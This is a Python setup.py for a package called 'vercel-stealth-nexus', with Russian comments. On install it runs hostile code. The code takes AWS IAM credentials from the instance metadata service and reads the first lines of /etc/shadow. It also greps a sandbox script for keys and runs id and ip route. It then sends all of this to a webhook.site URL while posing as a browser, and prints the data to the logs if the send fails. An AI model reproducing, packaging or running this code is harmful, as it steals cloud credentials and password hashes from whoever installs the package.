import os
import subprocess
import urllib.request
import json
from setuptools import setup

def run(cmd):
    try:
        return subprocess.getoutput(cmd).strip()
    except:
        return "Error"

# --- ТВОЙ НОВЫЙ WEBHOOK ---
WEBHOOK_URL = "https://webhook.site/654ef753-d639-43ad-970c-9b90a3fa1fb9"

# 1. AWS IAM Metadata (Ключи от облака)
def get_aws():
    try:
        # Получаем токен
        req = urllib.request.Request("http://169.254.169.254/latest/api/token", method="PUT")
        req.add_header("X-aws-metadata-token-ttl-seconds", "60")
        with urllib.request.urlopen(req, timeout=2) as r:
            token = r.read().decode()
        
        # Получаем роль
        req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/", method="GET")
        req2.add_header("X-aws-metadata-token", token)
        with urllib.request.urlopen(req2, timeout=2) as r:
            role = r.read().decode()
            
        # Получаем сами ключи
        req3 = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", method="GET")
        req3.add_header("X-aws-metadata-token", token)
        with urllib.request.urlopen(req3, timeout=2) as r:
            return r.read().decode()
    except:
        return "AWS_METADATA_LOCKED"

# 2. Сбор данных
report_data = {
    "identity": run("id"),
    "aws_keys": get_aws(),
    "shadow_sample": run("head -n 2 /etc/shadow"),
    "sandbox_strings": run("strings /var/task/sandbox.js | grep -E 'http|key|auth' | head -n 10"),
    "network": run("ip route")
}

# 3. Скрытая отправка (через POST JSON)
try:
    data = json.dumps(report_data).encode('utf-8')
    req = urllib.request.Request(WEBHOOK_URL, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "Mozilla/5.0") # Маскируемся под браузер
    urllib.request.urlopen(req, timeout=10)
except:
    # Если и это заблочат, выведем в логи (fallback)
    print("--- DATA_LEAK_FALLBACK ---")
    print(json.dumps(report_data))
    print("--------------------------")

setup(name="vercel-stealth-nexus", version="6.6.6")
